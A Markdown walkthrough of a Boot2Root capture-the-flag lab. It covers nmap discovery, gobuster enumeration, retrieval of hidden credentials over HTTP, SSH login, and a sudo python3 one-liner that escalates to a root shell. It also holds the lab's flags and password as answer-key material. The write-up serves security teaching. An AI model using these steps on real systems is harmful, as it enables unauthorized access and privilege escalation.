# ✅ Boot2Root Walkthrough

---

### 🎯 Overview

This is a realistic **Boot2Root CTF challenge** simulating a real-world penetration test. Your objectives are:

1. **Discover the target’s IP** on the network.
2. **Identify open ports and services**.
3. **Find hidden files** using directory brute-forcing tools.
4. **Retrieve user credentials and hints**.
5. **SSH into the system** as `ctfuser`.
6. **Access `user.txt`** for the first flag.
7. **Escalate privileges to root**.
8. **Access `root.txt`** for the final flag.

---

## 📦 Target Setup Summary

| Item     | Description                                                                  |
| -------- | ---------------------------------------------------------------------------- |
| OS       | Debian 13.0.0 (netinst)                                                      |
| Users    | `ctfuser` (challenge user), `inno` (decoy admin user)                        |
| Services | SSH on port 22, Apache web server on port 80                                 |
| Files    | Hidden files under `/var/www/html/hidden/`, containing credentials and hints |
| Flags    | `user.txt` in `/home/ctfuser`, `root.txt` in `/root`                         |

---

## 🔎 1️⃣ Discover the Target IP

Begin by scanning for active hosts on your subnet:

```bash
nmap -sn <your-subnet>/24
```

**Sample Output:**

```
Nmap scan report for <target-ip>
Host is up (0.0016s latency).
```

---

## 🔍 2️⃣ Scan for Open Ports

Use `nmap` to check for open services:

```bash
nmap -p- <target-ip>
```

**Expected Output:**

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

---

## 🧩 3️⃣ Explore the Web Server

Check the web server:

```bash
curl http://<target-ip>/
```

Inspect for clues, links, or directory listings.

---

## 📂 4️⃣ Find Hidden Files Using Gobuster

Brute-force directories to locate hidden files:

### Install Gobuster

```bash
sudo apt install gobuster
```

### Run Gobuster

```bash
gobuster dir -u http://<target-ip>/hidden/ -w /usr/share/wordlists/dirb/common.txt -x txt,b64
```

**Output Example:**

```
/hidden/.user.txt (Status: 200)
/hidden/.hint.b64 (Status: 200)
```

---

## 📂 5️⃣ Retrieve the Files

### Get the Username

```bash
curl http://<target-ip>/hidden/.user.txt
```

```
ctfuser
```

### Get the Password Hint (Base64 Encoded)

```bash
curl http://<target-ip>/hidden/.hint.b64 | base64 --decode
```

```
Password is ctfpass
```

---

## 🔑 6️⃣ SSH into the Target

Login with discovered credentials:

```bash
ssh ctfuser@<target-ip>
```

Password: `ctfpass`

---

## 📄 7️⃣ Read `user.txt` for the First Flag

Inside your SSH session:

```bash
cat /home/ctfuser/user.txt
```

```
Flag{kappa_dance_in_rainy_days}
```

---

## ⚙️ 8️⃣ Privilege Escalation — Accessing `root.txt`

Check sudo permissions:

```bash
sudo -l
```

```
User ctfuser may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/python3
```

Exploit to get root shell:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

## 🔐 9️⃣ Read `root.txt` for the Final Flag

```bash
cat /root/root.txt
```

```
Flag{ultimate_root_power}
```

---

## 🎯 Conclusion

You have:

- ✅ Discovered the target via network scanning
- ✅ Found hidden files using `gobuster`
- ✅ Retrieved credentials
- ✅ Logged in via SSH
- ✅ Accessed the user flag
- ✅ Escalated to root via `sudo`
- ✅ Captured the root flag

This CTF covers reconnaissance, enumeration, exploitation, and privilege escalation, just like a real-world pentest.

---

## 📌 Notes

* The `inno` user is a decoy.
* The web server hides critical files for enumeration.
* Designed to reward careful investigation.

---

## 🥂 Cheers!

<svg width="140" height="80" viewBox="0 0 140 80">
  <g>
    <!-- Left glass -->
    <ellipse cx="45" cy="60" rx="16" ry="8" fill="#fafafa" stroke="#c7c7c7" stroke-width="2"/>
    <rect x="37" y="35" width="16" height="25" fill="#f8e7a2" stroke="#c7c7c7" stroke-width="2" rx="8"/>
    <rect x="43" y="65" width="4" height="15" fill="#c7c7c7"/>
    <!-- Right glass -->
    <ellipse cx="95" cy="60" rx="16" ry="8" fill="#fafafa" stroke="#c7c7c7" stroke-width="2"/>
    <rect x="87" y="35" width="16" height="25" fill="#f8e7a2" stroke="#c7c7c7" stroke-width="2" rx="8"/>
    <rect x="93" y="65" width="4" height="15" fill="#c7c7c7"/>
    <!-- Cheers animation -->
    <animateTransform attributeName="transform" type="rotate"
      values="0 70 60; -15 70 60; 15 70 60; 0 70 60" dur="1.5s" repeatCount="indefinite"/>
    <!-- Sparkles -->
    <circle cx="70" cy="20" r="2" fill="#ffd700">
      <animate attributeName="r" values="2;4;2" dur="1.5s" repeatCount="indefinite"/>
    </circle>
    <circle cx="60" cy="27" r="1.2" fill="#ffd700">
      <animate attributeName="r" values="1.2;2;1.2" dur="1.5s" repeatCount="indefinite"/>
    </circle>
    <circle cx="80" cy="24" r="1.5" fill="#ffd700">
      <animate attributeName="r" values="1.5;3;1.5" dur="1.5s" repeatCount="indefinite"/>
    </circle>
  </g>
</svg>

**Congratulations!**  
Raise a glass to your hacking skills and completion of the challenge! 🎉🍷

---
